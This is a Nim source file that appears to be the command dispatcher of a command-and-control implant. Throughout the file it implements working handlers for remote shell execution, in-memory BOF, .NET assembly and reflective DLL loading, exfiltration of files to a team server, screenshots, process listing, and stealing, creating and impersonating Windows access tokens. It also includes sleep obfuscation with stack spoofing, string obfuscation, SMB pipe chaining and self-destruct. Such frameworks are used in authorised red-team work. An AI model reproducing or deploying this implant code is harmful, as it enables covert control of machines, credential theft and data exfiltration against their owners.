import winim/lean
import tables, strformat, strutils
import ../../../common/[serialize, utils]
import ../../../types/[common, agent, protocol]
import ../utils/[io, metadata]
import ../protocol/result
import ./[exit, job]
import ./transport/smb

var commands* = newTable[CommandType, proc(ctx: AgentCtx, task: Task): TaskResult]()

# Assign the "not implemented" function to all commands by default
# This function is overwritten if by the actual implementation if the corresponding module is enabled during the payload generation
for cmd in low(CommandType) .. high(CommandType): 
    commands[cmd] = proc (ctx: AgentCtx, task: Task): TaskResult =
        let command = cast[CommandType](task.command)
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Command \"") & $command & protect("\" not enabled.")))

#[
    Built-in modules (always enabled)
    - Agent configuration
    - Exit
    - SMB linking 
    - Job management
]#
commands[CMD_CONFIG] = proc(ctx: AgentCtx, task: Task): TaskResult =
    try:
        print "   [>] Updating agent configuration."

        const UNSET = high(uint32) # -1
        let 
            sleepDelay = Bytes.toUint32(task.args[0].data)
            jitter = Bytes.toUint32(task.args[1].data)
            technique = Bytes.toString(task.args[2].data)
            spoof = cast[bool](task.args[3].data[0])
            noSpoof = cast[bool](task.args[4].data[0])

        if sleepDelay != UNSET: 
            ctx.sleepSettings.sleepDelay = sleepDelay
        if jitter != UNSET: 
            ctx.sleepSettings.jitter = jitter
        if technique.len > 0:
            ctx.sleepSettings.sleepTechnique = parseEnum[SleepObfuscationTechnique](technique.toUpperAscii())
        if spoof: 
            ctx.sleepSettings.spoofStack = true
        if noSpoof: 
            ctx.sleepSettings.spoofStack = false

        let spoofStack = 
            if ctx.sleepSettings.spoofStack and ctx.sleepSettings.sleepTechnique notin {EKKO, ZILEAN}:
                "true (unused)" # Stack spoofing is only available for EKKO and ZILEAN
            else:
                $ctx.sleepSettings.spoofStack

        let config = fmt"""Sleep settings:
 - Delay:          {$ctx.sleepSettings.sleepDelay}s
 - Jitter:         {$ctx.sleepSettings.jitter}%
 - Sleepmask:      {$ctx.sleepSettings.sleepTechnique}
 - Stack spoofing: {spoofStack}"""

        # Return binary structure containing sleepDelay and overall agent config
        # The sleep delay is updated in the team server database and on the client 
        var packer = Packer.init()
        packer.add(ctx.sleepSettings.sleepDelay)
        packer.addDataWithLengthPrefix(string.toBytes(config))
        
        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

commands[CMD_EXIT] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print "   [>] Exiting."
        
        let exitType = parseEnum[ExitType](Bytes.toString(task.args[0].data).toLowerAscii())
        exit(exitType)

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
commands[CMD_SELF_DESTRUCT] = proc(ctx: AgentCtx, task: Task): TaskResult =
    try: 
        print "   [>] Self-destructing."
        exit(EXIT_PROCESS, true)

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
commands[CMD_LINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print "   [>] Linking agent."

        let host = Bytes.toString(task.args[0].data)
        let pipe = Bytes.toString(task.args[1].data)

        # Link agent
        let data = ctx.link("\\\\" & host & "\\pipe\\" & pipe)
        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
    
commands[CMD_UNLINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print "   [>] Unlinking agent."

        let agentId = Bytes.toString(task.args[0].data)

        # Unlink agent
        ctx.unlink(agentId)
        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, string.toBytes(agentId))

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

commands[CMD_LINKS] = proc(ctx: AgentCtx, task: Task): TaskResult =
    try:
        print "   [>] Listing linked agents."
        
        var packer = Packer.init()
        packer.add(cast[uint32](ctx.links.len()))
        for linkedAgentId, hPipe in ctx.links:
            packer.add(linkedAgentId)

        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

commands[CMD_JOBS] = proc(ctx: AgentCtx, task: Task): TaskResult =
    try:
        print "   [>] Listing jobs."
        
        var packer = Packer.init()
        packer.add(cast[uint32](ctx.jobs.len()))
        for job in ctx.jobs:
            packer.add(job.task.taskId)
            packer.add(job.task.command)
            packer.add(job.task.timestamp)

        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

commands[CMD_CANCEL] = proc(ctx: AgentCtx, task: Task): TaskResult =
    try:
        print fmt"   [>] Cancelling job."

        let jobId = Bytes.toString(task.args[0].data)
        
        if not ctx.cancelJob(string.toUuid(jobId)):
            raise newException(CatchableError, protect("Job not found: ") & jobId)

        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

    except CatchableError as err:
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

#[
    Optional modules (can be enabled during payload generation)
    - shell execution
    - bof execution
    - dotnet assembly execution
    - looting 
    - token manipulation 
    - filesystem operations
]#

when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
    import osproc

    commands[CMD_SHELL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let command = Bytes.toString(task.args[0].data)
            var arguments = ""

            for i in 1 ..< task.args.len:
                if task.args[i].data.len > 0:
                    arguments &= Bytes.toString(task.args[i].data) & " "

            print fmt"   [>] Executing command: {command} {arguments}"

            let (output, status) = execCmdEx(fmt("{command} {arguments}")) 

            if output != "":
                return ctx.createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
            else: 
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
    import ../utils/coff 

    commands[CMD_BOF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let 
                objectFile: seq[byte] = task.args[0].data
                arguments: seq[byte] = Bytes.fromHex(task.args[1].data)

            # Unpacking object file, since it contains the file name too.
            var unpacker = Unpacker.init(Bytes.toString(objectFile))
            let 
                fileName = unpacker.getDataWithLengthPrefix()
                objectFileContents = unpacker.getDataWithLengthPrefix()

            print fmt"   [>] Executing object file {fileName}." 
            let output = inlineExecuteGetOutput(string.toBytes(objectFileContents), arguments)

            if output != "":
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
            else: 
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
    import ../utils/clr 

    commands[CMD_DOTNET] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let assembly = task.args[0].data
            var arguments: seq[string] = @[]

            # Parse assembly arguments into a list of strings
            if task.args.len > 1 and task.args[1].data.len > 0:
                let input = Bytes.toString(task.args[1].data)
                var j = 0
                while j < input.len:
                    while j < input.len and input[j] in {' ', '\t'}: inc j
                    if j >= input.len: break
                    var arg = ""
                    if input[j] == '"':
                        inc j
                        while j < input.len and input[j] != '"':
                            arg.add(input[j]); inc j
                        if j < input.len: inc j
                    else:
                        while j < input.len and input[j] notin {' ', '\t'}:
                            arg.add(input[j]); inc j
                    if arg.len > 0: arguments.add(arg)
            
            var unpacker = Unpacker.init(Bytes.toString(assembly))
            let 
                fileName = unpacker.getDataWithLengthPrefix()
                assemblyBytes = unpacker.getDataWithLengthPrefix()

            print fmt"   [>] Executing .NET assembly {fileName}."
            let (assemblyInfo, output) = dotnetInlineExecuteGetOutput(string.toBytes(assemblyBytes), arguments)
            
            if output != "":
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(assemblyInfo & "\n" & output))
            else: 
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
                
        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
    import ../utils/rdll
    
    proc dllJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
        var unpacker = Unpacker.init(Bytes.toString(task.args[0].data))
        let
            dllName: string = unpacker.getDataWithLengthPrefix()
            dllBytes: seq[byte] = string.toBytes(unpacker.getDataWithLengthPrefix())
            exportName: string = Bytes.toString(task.args[1].data)
            args: seq[byte] = Bytes.fromHex(task.args[2].data)
        
        print fmt"   [>] Executing DLL {dllName} as a new job."
        execDll(dllBytes, exportName, args, hWrite, ctx.hWakeupEvent, hStopEvent)
        
    commands[CMD_DLL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            if not ctx.startJob(task, dllJob):
                raise newException(CatchableError, GetLastError().getError())
            
            return ctx.createTaskResult(task, STATUS_STARTED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err:
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FILETRANSFER)):
    import os

    const DOWNLOAD_CHUNK_SIZE* = 512 * 1024

    proc downloadJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
        let filePath = absolutePath(Bytes.toString(task.args[0].data))
        
        let hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
        if hFile == INVALID_HANDLE_VALUE:
            return
        defer: CloseHandle(hFile)

        var buffer: array[DOWNLOAD_CHUNK_SIZE, byte]
        while WaitForSingleObject(hStopEvent, 0) == WAIT_TIMEOUT:
            var dwBytesRead: DWORD
            if ReadFile(hFile, addr buffer[0], DOWNLOAD_CHUNK_SIZE, addr dwBytesRead, nil) == FALSE or dwBytesRead == 0:
                break
            
            var dwBytesWritten: DWORD
            if WriteFile(hWrite, addr buffer[0], dwBytesRead, addr dwBytesWritten, nil) == FALSE:
                break

    commands[CMD_DOWNLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
            try: 
                let filePath = absolutePath(Bytes.toString(task.args[0].data)) 
                print fmt"   [>] Downloading {filePath}"

                if not fileExists(filePath):
                    raise newException(CatchableError, protect("File not found: ") & filePath)

                let totalSize = getFileSize(filePath)

                if not ctx.startJob(task, downloadJob):
                    raise newException(CatchableError, GetLastError().getError())

                var packer = Packer.init() 
                packer.addDataWithLengthPrefix(string.toBytes(filePath))
                packer.add(cast[uint64](totalSize))

                # Return STATUS_STARTED packet with filename and total size
                return ctx.createTaskResult(task, STATUS_STARTED, RESULT_BINARY, packer.pack())

            except CatchableError as err: 
                return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))    

    commands[CMD_UPLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let arg = Bytes.toString(task.args[0].data) 

            # Parse binary argument
            var unpacker = Unpacker.init(arg) 
            var 
                destination = unpacker.getDataWithLengthPrefix() 
                fileContents = unpacker.getDataWithLengthPrefix() 

            # If a destination has been passed as an argument, use it instead
            if task.args[1].data.len > 0: 
                destination = Bytes.toString(task.args[1].data)
        
            # Write the file to the specified destination
            writeFile(destination, fileContents)

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREENSHOT)):
    import times
    import ../utils/screenshot 

    commands[CMD_SCREENSHOT] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "    [>] Taking and uploading screenshot."

            let
                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.jpeg"
                screenshotBytes: seq[byte] = bmpToJpeg(takeScreenshot())

            var packer = Packer.init() 

            packer.addDataWithLengthPrefix(string.toBytes(screenshotFilename))
            packer.addDataWithLengthPrefix(screenshotBytes)

            let data = packer.pack() 

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_PROCESS)) == cast[uint32](MODULE_PROCESS)):
    import ../utils/process

    commands[CMD_PS] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Listing running processes."

            let procList = processList() 
            
            # Add process data to send to the team server
            var packer = Packer.init() 
            packer.add(cast[uint32](procList.len()))    
            for procInfo in procList: 
                packer
                    .add(cast[uint32](procInfo.pid))                            # [PID]: 4 bytes 
                    .add(cast[uint32](procInfo.ppid))                           # [PPID]: 4 bytes 
                    .addDataWithLengthPrefix(string.toBytes(procInfo.name))     # [Process name]: Variable 
                    .addDataWithLengthPrefix(string.toBytes(procInfo.user))     # [Process user]: Variable
                    .add(cast[uint32](procInfo.session))                        # [Session]: 4 bytes

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
    import ../utils/token

    commands[CMD_MAKE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =  
        try: 
            print fmt"   [>] Creating access token from username and password."
            
            let 
                username = Bytes.toString(task.args[0].data)
                password = Bytes.toString(task.args[1].data)
                logonType: DWORD = cast[DWORD](Bytes.toUint32(task.args[2].data))
                store = cast[bool](task.args[3].data[0])
        
            # Split username and domain at separator '\'
            let userParts = username.split("\\", 1)
            if userParts.len() != 2: 
                raise newException(CatchableError, protect("Expected format domain\\username."))
            
            let hToken = makeToken(userParts[1], password, userParts[0], logonType)
            var tokenUsername = getTokenUser(hToken).username
            if logonType != LOGON32_LOGON_NEW_CREDENTIALS:
                tokenUsername = username
            else:
                tokenUsername = username
                
            if store:
                ctx.tokenVault.add(hToken)
            else:
                CloseHandle(hToken)

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {tokenUsername}."))

        except CatchableError as err:
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_STEAL_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =
        try:
            print fmt"   [>] Stealing access token."

            let
                pid = int(Bytes.toUint32(task.args[0].data))
                store = cast[bool](task.args[1].data[0])

            let hToken = stealToken(pid)
            let tokenUsername = getTokenUser(hToken).username

            if store:
                ctx.tokenVault.add(hToken)
            else:
                CloseHandle(hToken)

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {tokenUsername}."))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
    
    commands[CMD_USE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Impersonating token from vault."

            let tokenId = int(Bytes.toUint32(task.args[0].data))
            if tokenId < 1 or tokenId > ctx.tokenVault.len():
                return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(fmt"Invalid token ID: {tokenId}"))
            
            let hToken = ctx.tokenVault[tokenId - 1]
            let username = getTokenUser(hToken).username
            impersonate(hToken)

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_REMOVE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =
        try:
            print fmt"   [>] Removing token from vault."

            # Clear token vault
            if cast[bool](task.args[1].data[0]):
                for hToken in ctx.tokenVault:
                    CloseHandle(hToken)
                ctx.tokenVault.setLen(0)
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes("Removed all tokens from vault."))
            
            let tokenId = int(Bytes.toUint32(task.args[0].data))
            if tokenId < 1 or tokenId > ctx.tokenVault.len():
                return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(fmt"Invalid token ID: {tokenId}"))

            CloseHandle(ctx.tokenVault[tokenId - 1])
            ctx.tokenVault.del(tokenId - 1)

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Removed token {tokenId} from vault."))

        except CatchableError as err:
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_REV2SELF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Reverting access token."
            rev2self()
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    commands[CMD_TOKEN_VAULT] = proc(ctx: AgentCtx, task: Task): TaskResult =
        try:
            print fmt"   [>] Listing token vault."
            if ctx.tokenVault.len == 0:
                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes("Token vault is empty."))
            
            var output = "ID".alignLeft(4) & "Handle".alignLeft(10) & "Username" & "\n"
            output &= "--".alignLeft(4) & "------".alignLeft(10) & "--------" & "\n"
            
            for i, hToken in ctx.tokenVault:
                let handle = "0x" & toHex(cast[uint64](hToken), 6)
                output &= ($(i + 1)).alignLeft(4) & handle.alignLeft(10) & getTokenUser(hToken).username & "\n"
            
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
        
        except CatchableError as err:
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_TOKEN_INFO] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Retrieving token information."
            let tokenInfo = getCurrentToken().getTokenInfo() 
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_ENABLE_PRIV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Enabling token privilege."
            let privilege = Bytes.toString(task.args[0].data)            
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege)))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_DISABLE_PRIV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Disabling token privilege."
            let privilege = Bytes.toString(task.args[0].data)            
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege, false)))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILESYSTEM)):
    import algorithm

    commands[CMD_PWD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Retrieving current working directory."
            
            # Get current working directory using GetCurrentDirectory
            let 
                buffer = newWString(MAX_PATH + 1)
                length = GetCurrentDirectoryW(MAX_PATH, &buffer)
            
            if length == 0:
                raise newException(CatchableError, GetLastError().getError())

            let output = $buffer[0 ..< (int)length]
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_CD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let targetDirectory = Bytes.toString(task.args[0].data)

            print fmt"   [>] Changing current working directory to {targetDirectory}."

            # Get current working directory using GetCurrentDirectory
            if SetCurrentDirectoryW(targetDirectory) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, string.toBytes(targetDirectory))

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_RM] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let target = Bytes.toString(task.args[0].data)

            print fmt"   [>] Deleting file {target}."

            if DeleteFile(target) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    commands[CMD_RMDIR] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let target = Bytes.toString(task.args[0].data)

            print fmt"   [>] Deleting directory {target}."

            if RemoveDirectoryA(target) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_MOVE] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let 
                lpExistingFileName = Bytes.toString(task.args[0].data)
                lpNewFileName = Bytes.toString(task.args[1].data)

            print fmt"   [>] Moving {lpExistingFileName} to {lpNewFileName}."

            if MoveFile(lpExistingFileName, lpNewFileName) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_COPY] = proc(ctx: AgentCtx, task: Task): TaskResult = 

        try: 
            let 
                lpExistingFileName = Bytes.toString(task.args[0].data)
                lpNewFileName = Bytes.toString(task.args[1].data)

            print fmt"   [>] Copying {lpExistingFileName} to {lpNewFileName}."

            # Copy file to new location, overwrite if a file with the same name already exists
            if CopyFile(lpExistingFileName, lpNewFileName, FALSE) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    
    # FILETIME is 100-nanosecond intervals since January 1, 1601
    # Unix timestamp is seconds since January 1, 1970 
    proc fileTimeToUnixTimestamp(ft: FILETIME): int64 =
        let fileTime64 = (int64(ft.dwHighDateTime) shl 32) or int64(cast[uint32](ft.dwLowDateTime))
        const EPOCH_DIFFERENCE = 116444736000000000'i64
        return (fileTime64 - EPOCH_DIFFERENCE) div 10000000

    commands[CMD_LS] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try:
            var targetDirectory: string

            # Check if directory argument was provided
            if task.args[0].data.len > 0: 
                targetDirectory = Bytes.toString(task.args[0].data)
            
            else:
                # Get current working directory
                let 
                    cwdBuffer = newWString(MAX_PATH + 1)
                    cwdLength = GetCurrentDirectoryW(MAX_PATH, &cwdBuffer)
                
                if cwdLength == 0:
                    raise newException(CatchableError, GetLastError().getError())

                targetDirectory = $cwdBuffer[0 ..< (int)cwdLength]

            # Retrieve absolute path 
            let pathBuffer = newWString(MAX_PATH + 1)
            let pathLength = GetFullPathNameW(targetDirectory, MAX_PATH, &pathBuffer, nil)
            if pathLength > 0:
                targetDirectory = $pathBuffer[0 ..< (int)pathLength]

            print fmt"   [>] Listing files and directories in {targetDirectory}."
                
            # Prepare search pattern
            let searchPattern = targetDirectory & "\\*"
            let searchPatternW = +$searchPattern
            
            var 
                findData: WIN32_FIND_DATAW
                hFind: HANDLE
                entries: seq[DirectoryEntry] = @[]
            
            hFind = FindFirstFileW(searchPatternW, &findData)            
            if hFind == INVALID_HANDLE_VALUE:
                raise newException(CatchableError, GetLastError().getError())
            
            # Process files and directories
            while true:
                let fileName = $cast[WideCString](addr findData.cFileName[0])
                
                # Skip current and parent directory entries
                if fileName != "." and fileName != "..":
                    let attrs = findData.dwFileAttributes
                    var fileSize = (uint64(cast[uint32](findData.nFileSizeHigh)) shl 32) or uint64(cast[uint32](findData.nFileSizeLow)) # Cast to uint32 beforehand to avoid sign-extension error
                    if fileSize >= 0xFFFFFF0000000000'u64:
                        fileSize = 0

                    # Build flags and update counters
                    var flags: uint8 = 0
                    if (attrs and FILE_ATTRIBUTE_DIRECTORY) != 0:
                        flags = flags or cast[uint8](IS_DIR)                    
                    if (attrs and FILE_ATTRIBUTE_HIDDEN) != 0:
                        flags = flags or cast[uint8](IS_HIDDEN)
                    if (attrs and FILE_ATTRIBUTE_READONLY) != 0:
                        flags = flags or cast[uint8](IS_READONLY)
                    if (attrs and FILE_ATTRIBUTE_ARCHIVE) != 0:
                        flags = flags or cast[uint8](IS_ARCHIVE)
                    if (attrs and FILE_ATTRIBUTE_SYSTEM) != 0:
                        flags = flags or cast[uint8](IS_SYSTEM)
                    
                    # Create entry
                    entries.add(DirectoryEntry(
                        name: fileName,
                        flags: flags,
                        size: fileSize,
                        lastWriteTime: fileTimeToUnixTimestamp(findData.ftLastWriteTime)
                    ))
                
                if FindNextFileW(hFind, &findData) == 0:
                    break
            
            discard FindClose(hFind)
            
            # Sort entries using an anonymous procedure (directories first)
            entries.sort do (a, b: DirectoryEntry) -> int:
                let aIsDir = (a.flags and cast[uint8](IS_DIR)) != 0
                let bIsDir = (b.flags and cast[uint8](IS_DIR)) != 0
                
                if aIsDir != bIsDir:
                    if aIsDir: -1 else: 1
                else:
                    cmp(a.name.toLowerAscii(), b.name.toLowerAscii())
            
            let packer = Packer.init()        
            packer.addDataWithLengthPrefix(string.toBytes(targetDirectory))
            packer.add(cast[uint32](entries.len()))
            for entry in entries:
                packer
                    .addDataWithLengthPrefix(string.toBytes(entry.name))
                    .add(entry.flags)
                    .add(entry.size)
                    .add(entry.lastWriteTime)
            
            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())

        except CatchableError as err: 
            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))